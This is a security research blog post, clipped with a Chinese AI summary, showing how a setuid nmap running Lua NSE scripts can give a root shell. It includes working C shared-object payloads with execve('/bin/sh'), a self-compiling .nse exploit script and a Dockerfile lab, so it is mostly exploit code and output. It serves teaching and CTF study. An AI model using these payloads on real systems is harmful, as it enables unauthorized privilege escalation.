---
title: Lua SUID Shells - elttam
source: https://www.elttam.com/blog/lua-suid-shells
source_host: www.elttam.com
clip_date: 2026-09-18T10:43:46+08:00
trace_id: 66e68b2e-07d2-48cc-8e7a-0fbfaf166445
content_hash: 744ca450ea32d167d3bf9d5c7552a674cac0b0cb37a24be57f8b08249465bb95
status: synced
tags:
  - Linux安全
  - 漏洞分析
series: null
feed_source: elttam
ai_summary: 通过SUID的nmap执行Lua脚本时，可借Lua的C扩展绕过shell降权，在不丢权限的情况下拿到root shell。
ai_summary_style: key-points:weak
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3df75244-d011-814f-a215-eeee9e59517e
ioc: null
---

> 💡 **AI 总结（key-points:weak）**
>
> 通过SUID的nmap执行Lua脚本时，可借Lua的C扩展绕过shell降权，在不丢权限的情况下拿到root shell。
> 
> - **背景：** elttam的hideandseek CTF挑战中，SUID nmap可用`-iL flag.txt`将flag泄露在报错信息里。
> - **命令执行：** nmap自2010年移除`--interactive`，但NSE脚本调用Lua的`os.execute`即可运行任意系统命令。
> - **降权原因：** Lua的`os.execute`直接调用C的`system`，后者以`/bin/sh -c <cmd>`执行，sh默认丢弃权限，且无法注入`-p`参数。
> - **失败尝试：** 用Lua文件API写`authorized_keys`/`.bashrc`，或借第三方chmod包（内部仍走`system`）打SUID位，都无法立即获得shell。
> - **可行方案：** 编写C语言Lua模块，`setuid(geteuid())`后`execve('/bin/sh',['-p'])`绕过shell保留权限；更简洁的是让共享对象带`__attribute__((constructor))`，被加载即执行。
> - **自动化利用：** payload可在Lua中写出C源码、`gcc -shared -fPIC`编译为`.so`再`require`加载，最终`uid=0`；作者附Dockerfile便于复现。

Share:

[](#)

Recently, elttam released a series of [CTF challenges](https://www.libctf.so/) that were created for [BSides Canberra](https://www.bsidesau.com.au/) and [Brucon](https://www.brucon.org/) a few years back. [Justin Steven](https://twitter.com/justinsteven) has been uploading a [YouTube](https://www.youtube.com/channel/UCCBmFvsR6sIPrmjSVVxY9ng) series containing solutions to some of these challenges. One of the challenges that was solved was a challenge called hideandseek. The challenge had a flag that was only accessible to the hideandseek user and required the user to find the suid nmap binary belonging to the hideandseek user. Justin quickly solved the hideandseek challenge using the intended solution of passing in flag.txt as a file containing list of hosts to scan and leaking it in an error message:

```
hahn@ubuntu1604:/challenges/hideandseek$ nmap -iL flag.txt

Starting Nmap 7.01 ( https://nmap.org ) at 2020-06-19 05:04 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

Failed to resolve 'libctf{2c8cb434-2d3b-426a-b5a4-97ebd038a7ef}'.
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.38 seconds
```

Justin spent some time trying to take it further by popping a shell without dropping privileges, however realised that this wasn’t as straight forward as originally hoped and decided to move onto the next challenge. This raised the question, how can we do it?

This blog will attempt to explore and solve the challenge of getting a shell through a setuid binary executing Lua scripts without dropping privileges. While this blog post will stick to using nmap for it’s examples, it’s important to note that this should affect most applications that run Lua scripts as a privileged user and is not limited to nmap.

Some readers might remember that nmap used to have an `--interactive` argument which allowed it to run arbitrary system commands. This could, in certain circumstances, allow privilege escalation if nmap had the setuid bit set (as seen in this challenge), or if a user was given access to run nmap with sudo:

```
$ nmap --interactive
nmap> !sh
sh-3.2#
```

## NSE执行系统命令

The `--interactive` argument was removed from nmap in [r17131](https://seclists.org/nmap-dev/2010/q1/1241) back in 2010, however another way of executing system commands is to use the [Nmap Scripting Engine (NSE)](https://nmap.org/book/man-nse.html) that leverages [Lua](https://www.lua.org/docs.html) to perform variety of networking tasks which is able to be easily automated. Here’s an example nmap script that uses Lua to run an arbitrary system command:

```sql
user@448a09095d55:~$ cat ./execute.nse
os.execute('sh');

user@448a09095d55:~$ nmap --script=execute.nse

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-19 06:48 UTC
$ uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
```

As demonstrated, using nmap to run abitrary system commands is pretty easy. So lets set up nmap to run as root and see what user we are when Lua executes our system command:

```ruby
root@448a09095d55:~# chmod u+s /usr/bin/nmap
root@448a09095d55:~# ls -l /usr/bin/nmap
-rwsr-xr-x. 1 root root 2961432 Apr 16  2018 /usr/bin/nmap
```

```
user@448a09095d55:~$ cat id.nse
os.execute('/usr/bin/id');
```

```plaintext
user@448a09095d55:~$ nmap --script=./id.nse

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-19 04:21 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
[...]

```

You may have expected that running `/usr/bin/id` through Lua from the suid binary would have been executed as root, however it’s still being executed by the current user. If we take a look at the [Lua source code](https://github.com/lua/lua/blob/63295f1f7fa052fabcb4d69d49203cf33a7deef0/loslib.c#L142-L153) to understand why, we can see that `os.execute()` takes a single argument which gets stored in the `cmd` variable, and then calls the underlying `system` function directly in C:

```cpp
static int os_execute (lua_State *L) {
  const char *cmd = luaL_optstring(L, 1, NULL);
  int stat;
  errno = 0;
  stat = system(cmd);
  if (cmd != NULL)
    return luaL_execresult(L, stat);
  else {
    lua_pushboolean(L, stat);  /* true if there is a shell */
    return 1;
  }
}
```

## system降权机制

This is problematic in our case because the way `system` works under the hood is by calling `execve()` with `['/bin/sh', '-c', '<cmd>']`. By default, `sh` will now drop privileges unless you provide a `-p` argument to tell it not to do so. As everything after `-c` is being treated as part of the command, we are unable to use any tricks like argument injection to introduce a `-p` argument. This means the expected behaviour is to have our privileges dropped before executing our command.

This behaviour of `system` can also be shown through the use of `strace`:

```sql
user@448a09095d55:~$ strace -f -e execve nmap --script=./id.nse
execve('/usr/bin/nmap', ['nmap', '--script=./id.nse'], 0x7ffe00dec7e0 /* 8 vars */) = 0

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-19 04:27 UTC
strace: Process 30 attached
[pid    30] execve('/bin/sh', ['sh', '-c', '/usr/bin/id'], 0x7ffe3b97c030 /* 8 vars */) = 0
strace: Process 31 attached
[pid    31] execve('/usr/bin/id', ['/usr/bin/id'], 0x55abbbe01b30 /* 8 vars */) = 0
uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)
[...]
```

I decided to start going through Lua documentation to look for other potential functionality that may allow for another process to be executed without dropping privileges.

One idea was to use Lua’s file APIs to read and write files to privileged areas as the suid user. This could include dropping in your own SSH key to `~/.ssh/authorized_keys` or modifying the user’s `~/.bashrc` to do something when they login. While this could work, this method isn’t guaranteed to result in a shell, or, may have a delay in receiving a shell. It’d be better if it was possible to have an immediate shell.

Lua has some support to chmod files through the use of external packages. This led me down another path exploring the idea of dropping an ELF file and trying to chmod a binary to set the suid bit through Lua. Unfortunately, all of the packages explored use a `system()` call to run the `/usr/bin/chmod` binary, which as we know, drops privileges and leaves us in the same position.

## 自定义C模块绕过

Another interesting piece of functionality that I came across was the ability to write [custom Lua functions](https://www.lua.org/pil/26.1.html) in C. This seemed promising as this would allow native C functions to be executed. This means the `execve` system call could be called from a custom Lua module that has been written in C, which would bypass the shell and not drop privileges. To test this idea, I created the following C module:

```objectivec
user@448a09095d55:~$ cat inluaofaname.c
#include 'lua.h'
#include 'lauxlib.h'
#include <unistd.h>

int sh(lua_State *L) {
    setuid(geteuid());
    char* argv[] = {'/bin/sh','-p',NULL}; // Start /bin/sh without dropping privs
    char* envp[] = {NULL};
    execve(argv[0], argv, envp);
    return 1;
}

static const struct luaL_Reg functions [] = {
    {'sh', sh},
    {NULL, NULL}
};

int luaopen_inluaofaname(lua_State *L) {
    lua_newtable(L);
    luaL_newlib (L, functions);
    lua_setglobal(L, 'inluaofaname');
    return 1;
}
```

The module was then compiled as a shared object and the following Lua script was created to use the new “inluaofaname” module:

```ruby
user@448a09095d55:~$ gcc -I/usr/include/lua5.3 -o inluaofaname.so -shared -fpic inluaofaname.c

user@448a09095d55:~$ cat inluaofaname.nse
package.cpath = './?.so'
require 'inluaofaname'
inluaofaname.sh()
```

Running nmap again and passing in the `inluaofaname.nse` Lua script, we can see that it was possible to successfully pop a shell without it dropping privileges:

```sql
user@448a09095d55:~$ nmap --script=./inluaofaname.nse

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-19 09:28 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

# uid=0(root) gid=1000(user) groups=1000(user),27(sudo)
#
```

## 构造函数加载即执行

While this certainly works, it does have a few caveats. Firstly, as it’s written for Lua 5.3, it would require modification to work with older versions of Lua. Secondly, not every box is guaranteed to have the Lua headers which would mean you would have to compile locally and uploading the shared object to the target. Daniel Hodson came up with a similar idea of using a shared object but using a constructor that which executes `/bin/sh`. This means when the shared object is loaded, the code would run immediately before anything else. The code is as follows:

```objectivec
#include <unistd.h>
static int luaopen_hello = 0;
static void before_main(void) __attribute__((constructor));
static void before_main(void)
{
  char *argv[] = {'/bin/sh', NULL};
  char *envp[] = {NULL};
  setreuid(geteuid(), geteuid());
  setregid(getegid(), getegid());
  execve(argv[0], argv, envp);
}
```

## Docker复现环境

I created the following Dockerfile that you can use if you want to test either payload yourself. It should be noted that the Docker environment differs slightly from the hideandseek challenge as the nmap binary is owned by root instead of the hideandseek user:

```dockerfile
FROM ubuntu:18.04

RUN apt update -y
RUN apt install -y \
    sudo \
    nmap \
    lua5.3 \
    lua5.3-dev \
    vim \
    gcc

RUN chmod u+s /usr/bin/nmap

# Create test user with password 'user'
RUN groupadd --gid 1000 user
RUN useradd -m --uid 1000 --gid 1000 -p '$6$xyz$uPGc.8fHvBhvadIKtIhOu6uNp5ySM5AA4/OCLPE3QyFJR2tczRv02BLAQoMZZaK0PKbGbgGRXXwk0.2hNHHyT0' user
RUN usermod -aG sudo user

WORKDIR /home/user
USER user

CMD ['bash']
```

The final `inluaofaname.nse` payload contains the following:

```objectivec
package.cpath = '/tmp/?.so'
payload = [[
#include <unistd.h>
static int luaopen_hello = 0;
static void before_main(void) __attribute__((constructor));
static void before_main(void)
{
  char *argv[] = {'/bin/sh', NULL};
  char *envp[] = {NULL};
  setuid(geteuid());
  setgid(getegid());
  execve(argv[0], argv, envp);
}
]]
local out = assert(io.open('/tmp/inluaofaname.c', 'wb'))
out:write(payload)
out:close()
os.execute('gcc /tmp/inluaofaname.c -o /tmp/inluaofaname.so -shared -fPIC')
require 'inluaofaname'
```

Piecing everything together, we are able to still run `/bin/sh` without dropping privileges:

```plaintext
user@448a09095d55:~$ nmap --script=./inluaofaname.nse

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-19 07:58 UTC
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

# uid=0(root) gid=1000(user) groups=1000(user),27(sudo)
#

```

The next time you pop a shell on a pentest and see something with setuid privileges that runs Lua scripts, try giving this a shot.
